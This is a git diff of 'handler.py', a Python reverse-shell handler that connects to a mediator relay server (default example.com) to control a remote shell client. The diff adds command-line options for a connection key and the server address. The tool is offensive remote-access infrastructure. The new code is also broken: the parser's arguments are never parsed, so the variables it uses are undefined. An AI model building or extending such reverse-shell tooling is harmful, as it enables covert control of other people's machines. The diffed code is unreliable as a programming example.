@@ -1,10 +1,11 @@
 #!/usr/bin/python3
 """
 Program: handler.py
-Author: C.J. May
-Description: Basic TCP stream interaction with a reverse shell -- to be used with mediator.py server to be bridged to the reverse shell client connection
+Author: C.J. May @lawnd0c
+Description: Basic TCP stream interaction with a reverse shell -- connects to mediator server to be bridged to the reverse shell client connection
 """
 
+import argparse
 from Crypto.Cipher import AES
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
@@ -126,6 +127,15 @@ class Handler:
 
 
 if __name__ == "__main__":
-    handler = Handler(mediatorHost="example.com")
+    parser = argparse.ArgumentParser(description="Reverse shell handler client to be used with a mediator server.")
+    parser.add_argument("-c", "--connection-key", dest="connectionKey", action="store",
+                        help="connection key to match to a reverse shell")
+    parser.add_argument("-s", "--server", dest="serverAddr", action="store",
+                        help="address of mediator server",
+                        default="example.com")
+    if connectionKey:
+        handler = Handler(mediatorHost=serverAddr, connectionKey=connectionKey)
+    else:
+        handler = Handler(mediatorHost=serverAddr)
     handler.run()
 
